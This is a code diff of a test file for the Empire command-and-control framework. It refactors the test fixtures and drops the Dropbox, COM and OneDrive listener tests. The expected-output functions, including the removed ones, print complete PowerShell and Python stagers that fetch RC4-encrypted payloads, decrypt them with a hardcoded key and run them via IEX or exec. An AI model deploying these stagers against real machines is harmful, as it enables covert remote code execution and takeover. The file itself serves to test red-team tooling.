@@ -7,45 +7,19 @@ from empire.server.common import helpers
 
 
 @pytest.fixture(scope="module", autouse=True)
-def setup_staging_key(db, models):
-    config = db.query(models.Config).first()
-    config.staging_key = "@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}"
-    db.add(config)
-    db.commit()
-    yield
+def _setup_staging_key(session_local, models):
+    with session_local.begin() as db:
+        config = db.query(models.Config).first()
+        config.staging_key = "@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}"
 
 
-@pytest.fixture(scope="function")
-def main_menu_mock(db, models):
+@pytest.fixture
+def main_menu_mock(models):
     main_menu = Mock()
     main_menu.installPath = ""
     main_menu.listeners.activeListeners = {}
     main_menu.listeners.listeners = {}
-    yield main_menu
-
-
-def test_dbx_generate_launcher(monkeypatch, main_menu_mock):
-    from empire.server.listeners.dbx import Listener
-
-    dbx_listener = Listener(main_menu_mock)
-
-    main_menu_mock.listeners.activeListeners = {
-        "fake_listener": {"options": dbx_listener.options}
-    }
-
-    dbx_listener.threads = {"fake_listener": {"fake_thread": {}}}
-
-    python_launcher = dbx_listener.generate_launcher(
-        listenerName="fake_listener", language="python", encode=False
-    )
-
-    assert python_launcher == _expected_dbx_python_launcher()
-
-    powershell_launcher = dbx_listener.generate_launcher(
-        listenerName="fake_listener", language="powershell", encode=False
-    )
-
-    assert powershell_launcher == _expected_dbx_powershell_launcher()
+    return main_menu
 
 
 def test_http_generate_launcher(monkeypatch, main_menu_mock):
@@ -72,51 +46,16 @@ def test_http_generate_launcher(monkeypatch, main_menu_mock):
     http_listener.threads = {"fake_listener": {"fake_thread": {}}}
 
     python_launcher = http_listener.generate_launcher(
-        listenerName="fake_listener", language="python", encode=False
+        listener_name="fake_listener", language="python", encode=False
     )
 
     assert python_launcher == _expected_http_python_launcher()
 
     powershell_launcher = http_listener.generate_launcher(
-        listenerName="fake_listener", language="powershell", encode=False
+        listener_name="fake_listener", language="powershell", encode=False
     )
 
     assert powershell_launcher == _expected_http_powershell_launcher()
-
-
-def test_http_com_generate_launcher(monkeypatch, main_menu_mock):
-    from empire.server.listeners.http_com import Listener
-
-    # guarantee the session id.
-    packets = Mock()
-    packets.build_routing_packet.return_value = b"routing packet"
-    monkeypatch.setattr("empire.server.listeners.http_com.packets", packets)
-
-    # guarantee the chosen stage0 url.
-    random = MagicMock()
-    random.choice.side_effect = lambda x: x[0]
-    monkeypatch.setattr("empire.server.listeners.http_com.random", random)
-
-    http_com_listener = Listener(main_menu_mock)
-
-    http_com_listener.options["Host"]["Value"] = "http://localhost"
-    main_menu_mock.listeners.activeListeners = {
-        "fake_listener": {"options": http_com_listener.options}
-    }
-
-    http_com_listener.threads = {"fake_listener": {"fake_thread": {}}}
-
-    python_launcher = http_com_listener.generate_launcher(
-        listenerName="fake_listener", language="python", encode=False
-    )
-
-    assert python_launcher is None
-
-    powershell_launcher = http_com_listener.generate_launcher(
-        listenerName="fake_listener", language="powershell", encode=False
-    )
-
-    assert powershell_launcher == _expected_http_com_powershell_launcher()
 
 
 def test_http_foreign_generate_launcher(monkeypatch, main_menu_mock):
@@ -138,13 +77,13 @@ def test_http_foreign_generate_launcher(monkeypatch, main_menu_mock):
     http_foreign_listener.threads = {"fake_listener": {"fake_thread": {}}}
 
     python_launcher = http_foreign_listener.generate_launcher(
-        listenerName="fake_listener", language="python", encode=False
+        listener_name="fake_listener", language="python", encode=False
     )
 
     assert python_launcher == _expected_http_foreign_python_launcher()
 
     powershell_launcher = http_foreign_listener.generate_launcher(
-        listenerName="fake_listener", language="powershell", encode=False
+        listener_name="fake_listener", language="powershell", encode=False
     )
 
     assert powershell_launcher == _expected_http_foreign_powershell_launcher()
@@ -166,9 +105,9 @@ def test_http_hop_generate_launcher(monkeypatch, main_menu_mock):
     http_hop_listener = Listener(main_menu_mock)
 
     http_hop_listener.options["Host"]["Value"] = "http://localhost"
-    http_hop_listener.options["DefaultProfile"][
-        "Value"
-    ] = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+    http_hop_listener.options["DefaultProfile"]["Value"] = (
+        "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+    )
     main_menu_mock.listeners.activeListeners = {
         "fake_listener": {"options": http_hop_listener.options}
     }
@@ -176,13 +115,13 @@ def test_http_hop_generate_launcher(monkeypatch, main_menu_mock):
     http_hop_listener.threads = {"fake_listener": {"fake_thread": {}}}
 
     python_launcher = http_hop_listener.generate_launcher(
-        listenerName="fake_listener", language="python", encode=False
+        listener_name="fake_listener", language="python", encode=False
     )
 
     assert python_launcher == _expected_http_hop_python_launcher()
 
     powershell_launcher = http_hop_listener.generate_launcher(
-        listenerName="fake_listener", language="powershell", encode=False
+        listener_name="fake_listener", language="powershell", encode=False
     )
 
     assert powershell_launcher == _expected_http_hop_powershell_launcher()
@@ -210,9 +149,7 @@ def test_http_malleable_generate_launcher(monkeypatch, main_menu_mock):
 
     session_mock = MagicMock()
     profile_mock = MagicMock()
-    session_mock.return_value.query.return_value.filter.return_value.first.return_value = (
-        profile_mock
-    )
+    session_mock.return_value.query.return_value.filter.return_value.first.return_value = profile_mock
     profile_mock.data = _fake_malleable_profile()
     monkeypatch.setattr(
         "empire.server.listeners.http_malleable.SessionLocal", session_mock
@@ -230,7 +167,7 @@ def test_http_malleable_generate_launcher(monkeypatch, main_menu_mock):
     http_malleable_listener.threads = {"fake_listener": {"fake_thread": {}}}
 
     python_launcher = http_malleable_listener.generate_launcher(
-        listenerName="fake_listener", language="python", encode=False
+        listener_name="fake_listener", language="python", encode=False
     )
 
     # can't control the random characters in the url path, so just removing it from the comparison.
@@ -255,7 +192,7 @@ def test_http_malleable_generate_launcher(monkeypatch, main_menu_mock):
     assert python_launcher == expected_python_launcher
 
     powershell_launcher = http_malleable_listener.generate_launcher(
-        listenerName="fake_listener", language="powershell", encode=False
+        listener_name="fake_listener", language="powershell", encode=False
     )
 
     powershell_launcher_start = powershell_launcher.find(")));$t=")
@@ -276,34 +213,6 @@ def test_http_malleable_generate_launcher(monkeypatch, main_menu_mock):
     )
 
     assert powershell_launcher == expected_powershell_launcher
-
-
-def test_onedrive_generate_launcher(monkeypatch, main_menu_mock):
-    from empire.server.listeners.onedrive import Listener
-
-    onedrive_listener = Listener(main_menu_mock)
-    onedrive_listener.stager_url = "http://localhost/stager.php"
-
-    main_menu_mock.listeners.activeListeners = {
-        "fake_listener": {
-            "options": onedrive_listener.options,
-            "stager_url": "http://localhost/stager.php",
-        }
-    }
-
-    onedrive_listener.threads = {"fake_listener": {"fake_thread": {}}}
-
-    python_launcher = onedrive_listener.generate_launcher(
-        listenerName="fake_listener", language="python", encode=False
-    )
-
-    assert python_launcher == "Python not implemented yet"
-
-    powershell_launcher = onedrive_listener.generate_launcher(
-        listenerName="fake_listener", language="powershell", encode=False
-    )
-
-    assert powershell_launcher == _expected_onedrive_powershell_launcher()
 
 
 def test_port_forward_pivot_generate_launcher(monkeypatch, main_menu_mock):
@@ -332,55 +241,16 @@ def test_port_forward_pivot_generate_launcher(monkeypatch, main_menu_mock):
     port_forward_pivot.threads = {"fake_listener": {"fake_thread": {}}}
 
     python_launcher = port_forward_pivot.generate_launcher(
-        listenerName="fake_listener", language="python", encode=False
+        listener_name="fake_listener", language="python", encode=False
     )
 
     assert python_launcher == _expected_redirector_python_launcher()
 
     powershell_launcher = port_forward_pivot.generate_launcher(
-        listenerName="fake_listener", language="powershell", encode=False
+        listener_name="fake_listener", language="powershell", encode=False
     )
 
     assert powershell_launcher == _expected_redirector_powershell_launcher()
-
-
-def _expected_dbx_powershell_launcher():
-    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$t='';$wc.Headers.Add("Authorization","Bearer $t");$wc.Headers.Add("Dropbox-API-Arg",'{"path":"/Empire/staging/debugps"}');$data=$wc.DownloadData('https://content.dropboxapi.com/2/files/download');$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
-
-
-def _expected_dbx_python_launcher():
-    return dedent(
-        """
-        import sys;import ssl;
-        if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
-        import urllib.request;
-        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
-        t='';
-        server='https://content.dropboxapi.com/2/files/download';
-        req=urllib.request.Request(server);
-        req.add_header('User-Agent',UA);
-        req.add_header("Authorization","Bearer "+t);
-        req.add_header("Dropbox-API-Arg",'{"path":"/Empire/staging/debugpy"}');
-        proxy = urllib.request.ProxyHandler();
-        o = urllib.request.build_opener(proxy);
-        urllib.request.install_opener(o);
-        a=urllib.request.urlopen(req).read();
-        IV=a[0:4];
-        data=a[4:];
-        key=IV+'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}'.encode('UTF-8');
-        S,j,out=list(range(256)),0,[];
-        for i in list(range(256)):
-            j=(j+S[i]+key[i%len(key)])%256;
-            S[i],S[j]=S[j],S[i];
-        i=j=0;
-        for char in data:
-            i=(i+1)%256;
-            j=(j+S[i])%256;
-            S[i],S[j]=S[j],S[i];
-            out.append(chr(char^S[(S[i]+S[j])%256]));
-        exec(''.join(out));
-        """
-    ).strip("\n")
 
 
 def _expected_http_powershell_launcher():
@@ -415,10 +285,6 @@ def _expected_http_python_launcher():
         exec(''.join(out));
         """
     ).strip("\n")
-
-
-def _expected_http_com_powershell_launcher():
-    return """$ErrorActionPreference = "SilentlyContinue";$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$c="CF-RAY: b'cm91dGluZyBwYWNrZXQ='";$ie.navigate2($ser+$t,$fl,0,$Null,$c);while($ie.busy){Start-Sleep -Milliseconds 100};$ht = $ie.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie.document, $Null).InnerHtml;try {$data=[System.Convert]::FromBase64String($ht)} catch {$Null}$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
 
 
 def _expected_http_foreign_powershell_launcher():
@@ -527,14 +393,6 @@ def _expected_http_malleable_python_launcher():
 
 def _expected_http_malleable_powershell_launcher():
     return """$ErrorActionPreference = "SilentlyContinue";$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc=New-Object System.Net.WebClient;$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADgAMAA=')));$t='/zxxuhptp/';$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ%3D");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..($data.length-1)];-join[Char[]](& $R $data ($IV+$K))|IEX"""
-
-
-def _expected_onedrive_python_launcher():
-    pass
-
-
-def _expected_onedrive_powershell_launcher():
-    return """$wc=New-Object System.Net.WebClient;$u='Microsoft SkyDriveSync 17.005.0107.0008 ship; Windows NT 10.0 (16299)';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$data=$wc.DownloadData('http://localhost/stager.php');$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
 
 
 def _fake_malleable_profile():
